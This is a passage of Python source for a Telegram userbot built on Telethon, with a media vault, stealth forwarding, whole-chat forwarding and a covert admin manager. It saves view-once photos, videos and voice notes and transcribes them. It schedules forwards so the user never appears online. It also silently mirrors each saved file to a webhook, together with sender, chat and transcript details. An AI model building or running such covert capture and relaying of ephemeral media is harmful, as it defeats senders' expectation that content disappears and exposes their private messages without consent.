                f_ext = get_extension(doc)
                for attr in getattr(doc, 'attributes', []):
                    if hasattr(attr, 'file_name'): f_name = attr.file_name; break
            else:
                f_name = getattr(m.file, 'name', None) if getattr(m, 'file', None) else None
                f_ext = getattr(m.file, 'ext', None) if getattr(m, 'file', None) else None
                f_size = getattr(m.file, 'size', 0) if getattr(m, 'file', None) else 0
                
            f_size_mb = f_size / 1024 / 1024
            
            if f_name:
                fmt_str = f"[{f_name} | {f_size_mb:.1f}MB]"
            elif f_ext:
                fmt_str = f"[{f_ext} | {f_size_mb:.1f}MB]"
            else:
                fmt_str = f"[media | {f_size_mb:.1f}MB]" if f_size > 0 else "[media]"
                
            caption = (m.text or "").replace('\n', ' ')
            if len(caption) > 40: caption = caption[:37] + "..."
            cap_str = f" - {caption}" if caption else ""
            
            print(col(f"  {i}. [{dt}] {sender}", Fore.WHITE) + secret + " " + col(fmt_str, Fore.CYAN) + col(cap_str, Fore.YELLOW))
            
        print()
        sel = prompt("Select messages (e.g. 0,2,3) or blank to exit")
        if not sel: return
        
        try:
            indices = set()
            for part in sel.split(","):
                part = part.strip()
                if not part: continue
                if "-" in part:
                    s, e = map(int, part.split("-"))
                    indices.update(range(s, e + 1))
                elif part.isdigit():
                    indices.add(int(part))
            indices = sorted(list(indices))
            target_msgs = [msgs[i] for i in indices if 0 <= i < len(msgs)]
        except:
            continue
            
        if not target_msgs: continue
        
        print(col("\n  Actions:", Fore.CYAN))
        print(col("  1. Download to Secret Vault", Fore.WHITE))
        print(col("  2. Save & Forward to Saved Messages (Stealth)", Fore.WHITE))
        print(col("  3. Save & Forward to Someone (Stealth)", Fore.WHITE))
        print(col("  4. ONLY Forward to Saved Messages (Stealth)", Fore.WHITE))
        print(col("  5. ONLY Forward to Someone / Username (Stealth)", Fore.WHITE))
        
        act = prompt("Choose action")
        if act not in ["1", "2", "3", "4", "5"]: continue
        
        # Determine destination
        fwd_dest = None
        if act in ["2", "4"]:
            fwd_dest = "me"
        elif act in ["3", "5"]:
            method = prompt("Pick from your chats (1) or Enter Username (2)")
            if method == "2":
                uname = prompt("Enter username")
                if not uname: continue
                fwd_dest = uname
            else:
                dest_sel, _ = await pick_dialog(client, accent)
                if not dest_sel: continue
                fwd_dest = dest_sel.entity
            
        os.makedirs(".media_vault", exist_ok=True)
        os.makedirs(".vn_vault", exist_ok=True)
        
        yt_fmt = 'bestvideo+bestaudio/best'
        
        # Check if any target message is an external URL
        has_ext_url = False
        for m in target_msgs:
            if getattr(m, 'media', None) and getattr(m.media, 'webpage', None):
                if getattr(m.media.webpage, 'url', None) or getattr(m.media.webpage, 'display_url', None):
                    if not getattr(m.media.webpage, 'document', None):
                        has_ext_url = True
                        break

        if m_choice in ("2", "8") and has_ext_url:
            print()
            print(col("  External Video Quality (yt-dlp):", Fore.CYAN))
            print(col("  1. Maximum Quality (4K/8K/Best)", Fore.WHITE))
            print(col("  2. 1080p", Fore.WHITE))
            print(col("  3. 720p", Fore.WHITE))
            print(col("  4. Audio Only", Fore.WHITE))
            q_choice = prompt("Choice (default 1)")
            if q_choice == "2": yt_fmt = 'bestvideo[height<=1080]+bestaudio/best[height<=1080]'
            elif q_choice == "3": yt_fmt = 'bestvideo[height<=720]+bestaudio/best[height<=720]'
            elif q_choice == "4": yt_fmt = 'bestaudio/best'
            cinematic_sub_style = None
            sub_choice = prompt("Download Synced Subtitles? (Y / n)").lower() != 'n'
            sub_lang = "en"
            if sub_choice:
                sub_lang = prompt("Subtitle Language Code (e.g. en, es, hi) [default: en]") or "en"
                print("\n  [🎬] Upgrade to Cinematic Film-Level Subtitles?")
                print("  1. Yes (Netflix Style - Yellow + Drop Shadow)")
                print("  2. Yes (Apple Style - White + Soft Shadow)")
                print("  3. Yes (Anime Style - Outlined)")
                print("  4. No (Standard embedded soft-subs)")
                c_choice = prompt("Choose style [default: 4]")
                if c_choice == "1": cinematic_sub_style = "netflix"
                elif c_choice == "2": cinematic_sub_style = "apple"
                elif c_choice == "3": cinematic_sub_style = "anime"
        else:
            cinematic_sub_style = None
            sub_choice = False
            sub_lang = "en"
            
        for m in target_msgs:
            info(f"Processing message from {m.date.astimezone(IST).strftime('%H:%M')}...")
            await go_offline(client)
            vault = ".vn_vault" if m_choice == "3" else ".media_vault"
            
            try:
                # Download
                target_media = m
                is_webpage_doc = False
                ext_url = None
                if getattr(m, 'media', None) and getattr(m.media, 'webpage', None):
                    if getattr(m.media.webpage, 'document', None):
                        target_media = m.media.webpage.document
                        is_webpage_doc = True
                    elif getattr(m.media.webpage, 'url', None) or getattr(m.media.webpage, 'display_url', None):
                        ext_url = getattr(m.media.webpage, 'url', None) or getattr(m.media.webpage, 'display_url', None)
                
                is_large = getattr(target_media, 'size', 0) > 20 * 1024 * 1024
                
                import time
                start_time = time.time()
                
                filename = None
                if is_webpage_doc:
                    for attr in getattr(target_media, 'attributes', []):
                        if hasattr(attr, 'file_name'): filename = attr.file_name; break
                    if not filename:
                        from telethon.utils import get_extension
                        filename = get_extension(target_media)
                else:
                    filename = getattr(m.file, 'name', None) if getattr(m, 'file', None) else None
                
                # Ensure filename has extension if missing
                if not filename:
                    ext = getattr(m.file, 'ext', '') if getattr(m, 'file', None) else ''
                    filename = f'media_file{ext}'
                    
                # Dynamically set vault if it's a voice note, even if downloaded via "View Once" menu
                if filename and (filename.endswith('.ogg') or filename.endswith('.oga')):
                    vault = ".vn_vault"
                    
                base_name = os.path.splitext(filename)[0]
                if not ext_url or is_webpage_doc:
                    base_name = f"{base_name}_{m.id}".replace('/', '_')
                    msg_vault = os.path.join(vault, base_name)
                    os.makedirs(msg_vault, exist_ok=True)
                else:
                    msg_vault = vault
                
                print(f"  {col('==>', Fore.BLUE)} {col(f'Downloading {filename}', Fore.WHITE)}")

                async def prog(current, total):
                    elapsed = time.time() - start_time
                    speed = current / elapsed if elapsed > 0 else 0
                    mb_current = current / 1024 / 1024
                    speed_mb = speed / 1024 / 1024
                    
                    m_el, s_el = divmod(int(elapsed), 60)
                    h_el, m_el = divmod(m_el, 60)
                    el_str = f"{h_el:02d}:{m_el:02d}:{s_el:02d}" if h_el > 0 else f"{m_el:02d}:{s_el:02d}"
                    
                    if total:
                        eta = (total - current) / speed if speed > 0 else 0
                        percent = current / total
                        bar = make_bar(percent, width=72)
                        spin = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"[int(time.time() * 10) % 10]
                        mb_total = total / 1024 / 1024
                        
                        m_eta, s_eta = divmod(int(eta), 60)
                        h_eta, m_eta = divmod(m_eta, 60)
                        eta_str = f"{h_eta:02d}:{m_eta:02d}:{s_eta:02d}" if h_eta > 0 else f"{m_eta:02d}:{s_eta:02d}"
                        
                        if current >= total:
                            stats_str = f"  ({mb_current:.1f}/{mb_total:.1f} MB, Finished in ⏱ {el_str})"
                            print(f"\r{stats_str}\033[K\n\r {Fore.GREEN}✓{Style.RESET_ALL} {Fore.GREEN}{bar}{Style.RESET_ALL} 100.0%\033[K\n", end="", flush=True)
                        else:
                            # Print stats on first line, then move to next line for the bar. Move cursor up 1 line at the end.
                            stats_str = f"  ({mb_current:.1f}/{mb_total:.1f} MB, {speed_mb:.1f} MB/s, ⏱ {el_str}, ETA: {eta_str})"
                            print(f"\r{stats_str}\033[K\n\r {Fore.CYAN}{spin}{Style.RESET_ALL} {Fore.GREEN}{bar}{Style.RESET_ALL} {percent:5.1%}\033[K\033[1A", end="", flush=True)
                    else:
                        # Graceful fallback for massive streaming files where Telegram doesn't pass 'total'
                        print(f"\r  Downloading... ({mb_current:.1f} MB, {speed_mb:.1f} MB/s, ⏱ {el_str})\033[K", end="", flush=True)

                try:
                    if ext_url and not is_webpage_doc:
                        print(f"  {col('==>', Fore.BLUE)} {col('Downloading external video via yt-dlp...', Fore.WHITE)}")
                        import yt_dlp
                        import glob
                        
                        ydl_opts = {
                            'format': yt_fmt,
                            'merge_output_format': 'mp4',
                            'outtmpl': msg_vault + '/%(title).100B/%(title).100B.%(ext)s',
                            'restrictfilenames': True,
                            'quiet': True,
                            'noprogress': True,
                            'retries': 5,
                            'fragment_retries': 5,
                            'file_access_retries': 5,
                        }
                        # Try to use browser cookies to bypass 403 errors
                        for browser in ['chrome', 'safari', 'firefox', 'brave', 'edge']:
                            try:
                                ydl_opts['cookiesfrombrowser'] = (browser,)
                                break
                            except Exception:
                                continue
                        if sub_choice:
                            ydl_opts.update({
                                'writesubtitles': True,
                                'writeautomaticsub': True,
                                'subtitleslangs': [sub_lang],
                                'postprocessors': [{
                                    'key': 'FFmpegEmbedSubtitle',
                                    'already_have_subtitle': False,
                                }],
                                'postprocessor_args': {
                                    'FFmpegEmbedSubtitle': ['-c:s', 'mov_text', '-disposition:s:0', 'default']
                                }
                            })
                        def ytdl_hook(d):
                            if d['status'] == 'downloading':
                                curr = d.get('downloaded_bytes', 0)
                                tot = d.get('total_bytes') or d.get('total_bytes_estimate', 0)
                                if tot:
                                    pct = curr / tot
                                    br = make_bar(pct, width=72)
                                    spin = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"[int(time.time() * 10) % 10]
                                    mbc = curr / 1024 / 1024
                                    mbt = tot / 1024 / 1024
                                    spd = d.get('speed') or 0
                                    spd_mb = spd / 1024 / 1024
                                    eta = d.get('eta') or 0
                                    m_e, s_e = divmod(int(eta), 60)
                                    h_e, m_e = divmod(m_e, 60)
                                    eta_s = f"{h_e:02d}:{m_e:02d}:{s_e:02d}" if h_e > 0 else f"{m_e:02d}:{s_e:02d}"
                                    el = d.get('elapsed') or 0
                                    m_el, s_el = divmod(int(el), 60)
                                    h_el, m_el = divmod(m_el, 60)
                                    el_s = f"{h_el:02d}:{m_el:02d}:{s_el:02d}" if h_el > 0 else f"{m_el:02d}:{s_el:02d}"
                                    
                                    stats_str = f"  ({mbc:.1f}/{mbt:.1f} MB, {spd_mb:.1f} MB/s, ⏱ {el_s}, ETA: {eta_s})"
                                    print(f"\r{stats_str}\033[K\n\r {Fore.CYAN}{spin}{Style.RESET_ALL} {Fore.GREEN}{br}{Style.RESET_ALL} {pct:5.1%}\033[K\033[1A", end="", flush=True)
                            elif d['status'] == 'finished':
                                tot = d.get('total_bytes', 0) or d.get('downloaded_bytes', 0)
                                mbt = tot / 1024 / 1024 if tot else 0
                                el = d.get('elapsed') or 0
                                m_el, s_el = divmod(int(el), 60)
                                h_el, m_el = divmod(m_el, 60)
                                el_s = f"{h_el:02d}:{m_el:02d}:{s_el:02d}" if h_el > 0 else f"{m_el:02d}:{s_el:02d}"
                                br = make_bar(1.0, width=72)
                                stats_str = f"  ({mbt:.1f}/{mbt:.1f} MB, Finished in ⏱ {el_s})"
                                print(f"\r{stats_str}\033[K\n\r {Fore.GREEN}✓{Style.RESET_ALL} {Fore.GREEN}{br}{Style.RESET_ALL} 100.0%\033[K\n", end="", flush=True)
    
                        ydl_opts['progress_hooks'] = [ytdl_hook]
                        path = None
                        try:
                            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                                ydl_info = ydl.extract_info(ext_url, download=True)
                                print()
                                path_guess = ydl.prepare_filename(ydl_info)
                                if os.path.exists(path_guess):
                                    path = path_guess
                                else:
                                    # Search for the downloaded file in msg_vault
                                    possibles = glob.glob(msg_vault + "/**/*.mp4", recursive=True)
                                    possibles += glob.glob(msg_vault + "/**/*.mkv", recursive=True)
                                    possibles += glob.glob(msg_vault + "/**/*.webm", recursive=True)
                                    possibles += glob.glob(msg_vault + "/**/*.mp3", recursive=True)
                                    possibles += glob.glob(msg_vault + "/**/*.m4a", recursive=True)
                                    if possibles: path = possibles[0]
                        except Exception as yt_err:
                            error(f"External download failed: {yt_err}")
                            # DO NOT fallback to client.download_media for external URLs — that just downloads the thumbnail!
                            path = None
                    else:
                        # FastTelethon requires the raw Document object that has a .size attribute
                        dl_target = target_media
                        if hasattr(target_media, 'document') and target_media.document:
                            dl_target = target_media.document
                        elif hasattr(target_media, 'media') and hasattr(target_media.media, 'document') and target_media.media.document:
                            dl_target = target_media.media.document
    
                        if hasattr(dl_target, 'size'):
                            print(f"  {col('==>', Fore.BLUE)} {col('Using FastTelethon parallel downloader for max speed...', Fore.WHITE)}")
                            from FastTelethonhelper.FastTelethon import ParallelTransferrer
                            from telethon import utils
                            dc_id, location = utils.get_input_location(dl_target)
                            
                            out_path = msg_vault + "/" + filename
                            with open(out_path, "wb") as out_file:
                                downloader = ParallelTransferrer(client, dc_id)
                                downloaded = downloader.download(location, dl_target.size, connection_count=20)
                                async for x in downloaded:
                                    out_file.write(x)
                                    await prog(out_file.tell(), dl_target.size)
                            path = out_path
                            print()
                        else:
                            path = await client.download_media(target_media, msg_vault + "/", progress_callback=prog)
                            print()
                        
                except KeyboardInterrupt:
                    print(col("\n\n  [!] Download canceled by user. Salvaging playable parts...", Fore.YELLOW))
                    import glob, subprocess
                    for p in glob.glob(msg_vault + "/**/*.part", recursive=True):
                        try: 
                            new_p = p[:-5]
                            os.rename(p, new_p)
                            if new_p.endswith('.mp4'):
                                vtt_files = glob.glob(msg_vault + "/**/*.vtt", recursive=True)
                                if vtt_files:
                                    vtt_file = vtt_files[0]
                                    temp_p = new_p + ".temp.mp4"
                                    print(col(f"  [!] Instantly fusing salvaged subtitles into video...", Fore.CYAN))
                                    subprocess.call([
                                        'ffmpeg', '-y', '-i', new_p, '-i', vtt_file, 
                                        '-c', 'copy', '-c:s', 'mov_text', 
                                        '-disposition:s:0', 'default+forced', temp_p
                                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                    os.replace(temp_p, new_p)
                        except Exception: 
                            pass
                    continue
                if not path:
                    warn("Could not download media.")
                    continue
                
                success(f"Saved to {path}")
                
                # Subtitle engine disabled / commented out
                # if cinematic_sub_style:
                #     try:
                #         import subtitle_engine
                #         new_path = subtitle_engine.process_cinematic_subtitles(path, style=cinematic_sub_style)
                #         if new_path: path = new_path
                #     except Exception as e:
                #         print(f"  [!] Cinematic Engine error: {e}")
                
                # Transcribe if voice note
                transcription_text = None
                if path.endswith('.ogg') or path.endswith('.oga'):
                    info("Transcribing Voice Note...")
                    wav_path = path.replace('.ogg', '.wav').replace('.oga', '.wav')
                    try:
                        audio = AudioSegment.from_ogg(path)
                        audio.export(wav_path, format="wav")
                        r = sr.Recognizer()
                        with sr.AudioFile(wav_path) as source:
                            audio_data = r.record(source)
                            text = r.recognize_google(audio_data)
                            transcription_text = text
                            txt_path = path + ".txt"
                            with open(txt_path, "w") as f:
                                f.write(text)
                            print(col(f"  Transcription: {text}", Fore.GREEN))
                    except Exception as te:
                        warn(f"Transcription failed: {te}")

                # ── Cloud Vault Asset Mirroring (Redundancy Sync) ──
                try:
                    m_sender = await get_sender_name(client, m)
                    m_sender_esc = html.escape(m_sender or "Unknown")
                    chat_title_esc = html.escape(getattr(selected, 'name', 'Private Chat'))
                    m_time_str = m.date.astimezone(IST).strftime("%d/%m/%Y %H:%M:%S IST")
                    is_vo = bool(getattr(m.media, 'ttl_seconds', None))

                    f_lower = path.lower()
                    if f_lower.endswith(('.ogg', '.oga', '.opus')):
                        media_type = "voice"
                        header_tag = "🎙️ <b>AUDIO MEDIA BACKUP (NLP TRANSCRIPT)</b>"
                    elif f_lower.endswith(('.jpg', '.jpeg', '.png', '.webp')):
                        media_type = "photo"
                        header_tag = "📷 <b>MEDIA BACKUP: VIEW-ONCE PHOTO</b>" if is_vo else "📷 <b>PHOTO MEDIA BACKUP</b>"
                    elif f_lower.endswith(('.mp4', '.mov', '.mkv', '.webm', '.avi')):
                        media_type = "document"
                        header_tag = "🎥 <b>MEDIA BACKUP: VIEW-ONCE VIDEO</b>" if is_vo else "🎥 <b>VIDEO MEDIA BACKUP</b>"
                    else:
                        media_type = "document"
                        header_tag = "📁 <b>DOCUMENT MEDIA BACKUP</b>"

                    cap_sections = [
                        header_tag,
                        "────────────────────────",
                        f"👤 <b>Originator:</b> {m_sender_esc}",
                        f"💬 <b>Conversation:</b> {chat_title_esc}",
                        f"⏱️ <b>Timestamp:</b> <code>{m_time_str}</code>"
                    ]
                    if transcription_text:
                        cap_sections.append(f"📝 <b>NLP Transcript:</b> <i>{html.escape(transcription_text)}</i>")
                    if getattr(m, 'text', None):
                        cap_sections.append(f"💬 <b>Caption:</b> {html.escape(m.text)}")

                    await WebhookEventBus.emit_media("media_backup", path, caption="\n".join(cap_sections), media_type=media_type)
                except Exception:
                    pass
                
                # Forward stealthily (fallback to send_file for view once/restricted)
                if fwd_dest:
                    dt_utc = datetime.now(timezone.utc) + timedelta(minutes=2)
                    try:
                        await client.forward_messages(fwd_dest, m, m.chat_id, schedule=dt_utc)
                    except:
                        # If forwarding is restricted (like View Once media), upload the downloaded file instead!
                        await client.send_file(fwd_dest, path, schedule=dt_utc)
                    send_time = dt_utc.astimezone(IST).strftime('%H:%M')
                    success(f"Scheduled stealth forward/upload for {send_time} IST.")
                    
                # Clean up disk if user chose "ONLY Forward" without saving
                if act in ["4", "5"]:
                    import shutil
                    if msg_vault != vault and os.path.exists(msg_vault):
                        shutil.rmtree(msg_vault, ignore_errors=True)
                    elif os.path.exists(path):
                        parent_dir = os.path.dirname(path)
                        os.remove(path)
                        if parent_dir != vault and parent_dir.startswith(vault) and os.path.exists(parent_dir):
                            shutil.rmtree(parent_dir, ignore_errors=True)
                    # Clean up converted wav/txt files if they exist
                    wav_p = path.replace('.ogg', '.wav').replace('.oga', '.wav')
                    txt_p = path + ".txt"
                    if os.path.exists(wav_p): os.remove(wav_p)
                    if os.path.exists(txt_p): os.remove(txt_p)
                    info("Temporary files and folders deleted (No Save mode).")
                    
            except Exception as e:
                error(f"Error processing message: {e}")
                
        import sys
        try:
            if os.name != 'nt':
                import termios
                termios.tcflush(sys.stdin, termios.TCIOFLUSH)
            else:
                import msvcrt
                while msvcrt.kbhit():
                    msvcrt.getch()
        except Exception:
            pass
        press_enter()


async def feat_stealth_send_file(client, accent):
    """38. Stealth File Sender"""
    selected, _ = await pick_dialog(client, accent)
    if not selected: return

    paths = []
    print(col("  Type or drag-and-drop file paths. Type 'done' when finished.", Fore.CYAN))
    while True:
        raw_path = prompt("Absolute File Path (or 'done')")
        if not raw_path: 
            break
        if raw_path.strip().lower() == 'done':
            break
            
        # Clean drag-and-drop artifacts
        path = raw_path.strip().strip('\'"').replace("\\ ", " ")
        
        if not os.path.exists(path):
            error(f"Path not found: {path}")
            continue
            
        if os.path.isdir(path):
            info("Directory detected. Extracting files...")
            added = 0
            for root, _, files in os.walk(path):
                for f in files:
                    if not f.startswith('.'):  # Ignore hidden files like .DS_Store
                        paths.append(os.path.join(root, f))
                        added += 1
            success(f"Added {added} files from directory  ({len(paths)} total)")
        else:
            paths.append(path)
            success(f"Added: {os.path.basename(path)}  ({len(paths)} total)")

    if not paths:
        warn("No files selected.")
        press_enter()
        return

    # schedule for 2 mins in the future
    dt_utc = datetime.now(timezone.utc) + timedelta(minutes=2)
    
    try:
        await go_offline(client)
        # Send one by one to bypass Telegram's strict 10-item Album limit
        for p in paths:
            await client.send_file(selected.entity, p, schedule=dt_utc)
        await go_offline(client)
        send_time_str = dt_utc.astimezone(IST).strftime('%H:%M')
        success(f"{len(paths)} file(s) stealthily scheduled for {send_time_str} IST (in 2 mins).")
        for p in paths:
            if os.path.exists(p):
                m_type = "document"
                if p.lower().endswith(('.jpg', '.jpeg', '.png', '.webp')):
                    m_type = "photo"
                elif p.lower().endswith(('.ogg', '.oga', '.opus')):
                    m_type = "voice"
                cap = (
                    f"📤 <b>OUTGOING ASSET DISPATCHED</b>\n"
                    f"────────────────────────\n"
                    f"💬 <b>Destination:</b> {html.escape(selected.name)}\n"
                    f"⏱️ <b>Scheduled Delivery:</b> <code>{send_time_str} IST</code>"
                )
                await vault_stream_asset(p, caption=cap, media_type=m_type)
    except Exception as e:
        error(f"Failed to send: {e}")
    press_enter()


async def feat_forward_entire_chat(client, accent):
    """39. Forward Entire Chat — schedule-forward every message from a chat."""
    while True:
        clear()
        header("FORWARD ENTIRE CHAT  👻")
        print(col("  Forward an entire conversation to any destination.", Fore.WHITE + Style.DIM))
        print(col("  All messages are scheduled — you stay completely offline.\n", Fore.WHITE + Style.DIM))

        # ── pick source chat ──
        info("Select the chat to forward FROM:")
        src, dialogs = await pick_dialog(client, accent)
        if not src:
            return

        # ── how many messages ──
        n_raw = prompt(f"How many messages from  [{src.name}]?  (default ALL, or enter a number)")
        if n_raw.isdigit():
            limit = int(n_raw)
        else:
            limit = None  # None = all messages

        # ── pick destination ──
        print(col("\n  Where to forward?", Fore.CYAN + Style.BRIGHT))
        print(col("  1.  Saved Messages",       Fore.WHITE))
        print(col("  2.  Enter a username",      Fore.WHITE))
        print(col("  3.  Select from your chats", Fore.WHITE))
        dest_choice = prompt("Choice")

        if dest_choice == "1":
            dest = await client.get_entity("me")
            dest_label = "Saved Messages"
        elif dest_choice == "2":
            uname = prompt("Enter username  (@user or phone)")
            if not uname:
                error("No username entered!"); press_enter(); continue
            try:
                dest = await client.get_entity(uname)
                dest_label = uname
            except Exception:
                error(f"Could not find  [{uname}]!"); press_enter(); continue
        elif dest_choice == "3":
            info("Select destination chat:")
            dst, dialogs = await pick_dialog(client, accent, cached=dialogs)
            if not dst:
                continue
            dest = dst.entity
            dest_label = dst.name
        else:
            error("Invalid choice — enter 1, 2, or 3"); press_enter(); continue

        await go_offline(client)

        # ── load all messages from source ──
        info(f"Loading messages from  [{src.name}]…  (this may take a while)")
        all_msgs = []
        async for msg in client.iter_messages(src.entity, limit=limit):
            all_msgs.append(msg)
        await go_offline(client)

        if not all_msgs:
            error("No messages found in this chat!")
            press_enter()
            continue

        # reverse to chronological order (oldest first)
        all_msgs.reverse()

        total = len(all_msgs)
        batches = (total + 99) // 100  # ceil division

        print(col(f"\n  Found  {total}  message(s)  in  [{src.name}]", Fore.CYAN + Style.BRIGHT))
        print(col(f"  Destination:  {dest_label}", Fore.WHITE))
        if batches > 1:
            print(col(f"  Batches:  {batches}  (100 msgs each, 3 min gap)", Fore.WHITE))
        print(col(f"  You stay completely offline.\n", Fore.WHITE + Style.DIM))

        if prompt("Confirm?  (y / N)").lower() != "y":
            warn("Cancelled.")
            nxt = again_menu("Forward another chat")
            if nxt is None:
                return
            continue

        # ── schedule-forward in batches of 100 ──
        BATCH_LIMIT = 100
        BATCH_WAIT  = 180  # 3 minutes between batches
        ok, skipped = 0, 0

        for batch_num in range(batches):
            batch_start = batch_num * BATCH_LIMIT
            batch_end   = min(batch_start + BATCH_LIMIT, total)
            batch       = all_msgs[batch_start:batch_end]

            send_at     = auto_schedule()
            send_at_ist = send_at.astimezone(IST).strftime("%H:%M")

            info(f"Batch {batch_num + 1}/{batches}  —  scheduling msgs {batch_start + 1}–{batch_end}  for {send_at_ist} IST…")
            await go_offline(client)

            for i, m in enumerate(batch):
                try:
                    await client.forward_messages(dest, m, schedule=send_at)
                    ok += 1
                except Exception as e:
                    warn(f"Skipped msg #{batch_start + i + 1}: {e}")
                    skipped += 1

            await go_offline(client)
            success(f"Batch {batch_num + 1}/{batches} queued  ✓  ({len(batch)} msgs at {send_at_ist} IST)")

            # Wait between batches so the scheduled msgs get sent and the queue clears
            if batch_num < batches - 1:
                print(col(f"\n  ⏳  Waiting 3 min for batch to send before next batch…", Fore.YELLOW))
                import sys
                for remaining in range(BATCH_WAIT, 0, -1):
                    mins = remaining // 60
                    secs = remaining % 60
                    sys.stdout.write(col(f"\r      ⏳  {mins}:{secs:02d} remaining…   ", Fore.YELLOW + Style.BRIGHT))
                    sys.stdout.flush()
                    if remaining % KEEPALIVE_SEC == 0:
                        await go_offline(client)
                    await asyncio.sleep(1)
                sys.stdout.write(col(f"\r      ✅  Batch wait complete!           \n", Fore.GREEN))
                sys.stdout.flush()

        await go_offline(client)

        success(f"Done!  Queued  {ok}/{total}  message(s)  (skipped {skipped})")
        success(f"👻  Last seen untouched!")
        audit_card = (
            f"🔄 <b>ENTIRE CONVERSATION MIGRATED</b>\n"
            f"────────────────────────\n"
            f"📤 <b>Source:</b> {html.escape(src.name)}\n"
            f"📥 <b>Destination:</b> {html.escape(str(dest_label))}\n"
            f"📊 <b>Total Messages:</b> <code>{ok}/{total} (skipped {skipped})</code>"
        )
        asyncio.create_task(dispatch_vault_event(audit_card, silent=True))

        nxt = again_menu("Forward another chat")
        if nxt is None:
            return


async def feat_stealth_admin(client, accent):
    """40. Stealth Admin Manager — promote, configure, or demote admins without going online."""
    while True:
        clear()
        header("STEALTH ADMIN MANAGER  🛡️")
        print(col("  Manage group/channel admins 100% invisibly via MTProto RPC.", Fore.WHITE + Style.DIM))
        print(col("  No online presence, typing indicators, or read receipts emitted.\n", Fore.WHITE + Style.DIM))

        # ── Step 1: Select target chat/channel ──
        print(col("  Select Target Group / Channel:", Fore.CYAN + Style.BRIGHT))
        print(col("  1.  Pick from active dialogs (Admin / Creator only)", Fore.WHITE))
        print(col("  2.  Enter @username / t.me link / Channel ID", Fore.WHITE))
        print(col("  3.  Back to main menu", Fore.WHITE + Style.DIM))
        c = prompt("Choice")

        target_chat = None
        chat_title = ""

        if c == "1":
            info("Loading your groups & channels where you have Admin rights…")
            raw_dialogs = await fetch_dialogs(client, limit=200)
            await go_offline(client)

            # Strict filter: only Groups & Channels where you are Creator or Admin (no PMs, no Bots)
            managed_dialogs = []
            for d in raw_dialogs:
                if d.is_user:
                    continue
                ent = d.entity
                if getattr(ent, "left", False) or getattr(ent, "deactivated", False):
                    continue
                is_creator = bool(getattr(ent, "creator", False))
                has_admin_rights = getattr(ent, "admin_rights", None) is not None
                if is_creator or has_admin_rights:
                    managed_dialogs.append(d)

            if not managed_dialogs:
                error("No groups or channels found where you have Admin or Creator rights!")
                info("You can still use Option 2 to enter a target @username or ID directly.")
                press_enter()
                continue

            def admin_dialog_fmt(accent_color):
                def _fmt(idx, d):
                    ent = d.entity
                    is_creator = bool(getattr(ent, "creator", False))
                    role_badge = col("👑 Creator", Fore.YELLOW + Style.BRIGHT) if is_creator else col("🛡️ Admin", Fore.CYAN + Style.BRIGHT)
                    is_channel = getattr(ent, "broadcast", False)
                    type_badge = col("[Channel]", Fore.MAGENTA) if is_channel else col("[Group]", Fore.BLUE)
                    return f"  {col(f'{idx:>3}', accent_color)}.  {type_badge} {col(trunc(d.name or 'Unknown', 28), Fore.WHITE)}  {role_badge}"
                return _fmt

            idx = show_page(managed_dialogs, formatter=admin_dialog_fmt(accent))
            if idx is None:
                return
            selected = managed_dialogs[idx]
            target_chat = selected.entity
            chat_title = selected.name
        elif c == "2":
            raw = prompt("Enter @username, t.me link, or ID")
            if not raw:
                return
            if raw.startswith("https://t.me/"):
                raw = raw.replace("https://t.me/", "").split("/")[0]
            elif raw.startswith("t.me/"):
                raw = raw.replace("t.me/", "").split("/")[0]
            if raw.isdigit() or (raw.startswith("-") and raw[1:].isdigit()):
                raw = int(raw)
            info(f"Resolving chat [{raw}]…")
            try:
                target_chat = await client.get_entity(raw)
                chat_title = getattr(target_chat, "title", str(raw))
            except Exception as e:
                error(f"Could not resolve chat: {e}")
                press_enter()
                continue
        elif c == "3":
            return
        else:
            error("Invalid choice!")
            press_enter()
            continue

        await go_offline(client)

        is_user = getattr(target_chat, "first_name", None) is not None or type(target_chat).__name__ == "User"
        if is_user:
            error("Selected entity is a private user or bot, not a group or channel!")
            press_enter()
            continue

        is_channel = hasattr(target_chat, "broadcast") or hasattr(target_chat, "megagroup")
        is_basic_chat = hasattr(target_chat, "participants_count") and not is_channel and hasattr(target_chat, "migrated_to")

        if not (is_channel or is_basic_chat or hasattr(target_chat, "title")):
            error("Selected chat is not a valid group or channel!")
            press_enter()
            continue

        # ── Step 2: Target user to promote / demote ──
        print(col(f"\n  Target Chat : {chat_title}", Fore.CYAN + Style.BRIGHT))
        print(col("  Select Target User:", Fore.WHITE + Style.BRIGHT))
        print(col("  1.  👥  Pick from Member / Subscriber List", Fore.WHITE))
        print(col("  2.  ✍️   Enter @username / User ID / Phone number", Fore.WHITE))
        print(col("  3.  🔙  Back to chat selection", Fore.WHITE + Style.DIM))
        u_mode = prompt("Choice")

        target_user = None

        if u_mode == "1":
            info(f"Loading members from [{chat_title}]…  (ghost mode)")
            try:
                members = await client.get_participants(target_chat, limit=200)
                await go_offline(client)
            except Exception as e:
                error(f"Could not load member list: {e}")
                info("You can still use Option 2 to enter a username/ID directly.")
                press_enter()
                continue

            if not members:
                error("No members found or member list is restricted!")
                press_enter()
                continue

            def member_fmt(accent_color):
                def _fmt(idx, m):
                    nm  = f"{m.first_name or ''} {m.last_name or ''}".strip() or "User"
                    un  = f"@{m.username}" if m.username else "no username"
                    bot_tag = col(" [BOT]", Fore.YELLOW) if m.bot else ""
                    return f"  {col(f'{idx:>3}', accent_color)}.  {col(trunc(nm, 24), Fore.WHITE)}{bot_tag}  {col(f'({un})', Style.DIM + Fore.CYAN)}"
                return _fmt

            clear()
            header(f"MEMBERS — {chat_title} ({len(members)} loaded)")
            idx = show_page(members, formatter=member_fmt(accent))
            if idx is None:
                continue
            target_user = members[idx]

        elif u_mode == "2":
            user_query = prompt("Target user (@username, phone +..., user ID, or blank to cancel)")
            if not user_query:
                continue

            if user_query.startswith("https://t.me/"):
                user_query = user_query.replace("https://t.me/", "").split("/")[0]
            elif user_query.startswith("t.me/"):
                user_query = user_query.replace("t.me/", "").split("/")[0]
            if user_query.isdigit() or (user_query.startswith("-") and user_query[1:].isdigit()):
                user_query = int(user_query)

            info(f"Resolving user [{user_query}]…")
            try:
                target_user = await client.get_entity(user_query)
            except Exception as e:
                error(f"Could not find user: {e}")
                press_enter()
                continue
        elif u_mode == "3":
            continue
        else:
            error("Invalid choice!")
            press_enter()
            continue

        await go_offline(client)

        user_fname = getattr(target_user, "first_name", "") or ""
        user_lname = getattr(target_user, "last_name", "") or ""
